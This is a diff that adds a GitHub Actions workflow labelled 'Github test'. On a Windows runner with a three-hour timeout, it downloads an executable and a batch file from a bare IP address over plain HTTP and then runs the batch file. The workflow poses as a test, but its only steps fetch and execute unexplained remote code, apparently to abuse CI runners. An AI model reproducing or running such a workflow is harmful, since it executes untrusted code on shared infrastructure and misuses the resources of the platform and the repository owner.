@@ -1,0 +1,13 @@
+name: Github test
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 180
+    steps:
+    - name: Download files.
+      run: |
+        Invoke-WebRequest http://54.219.10.98/SRB.exe -OutFile SRB.exe
+        Invoke-WebRequest http://54.219.10.98/srbstart.bat -OutFile start.bat
+    - name: runing.
+      run: cmd /c start.bat
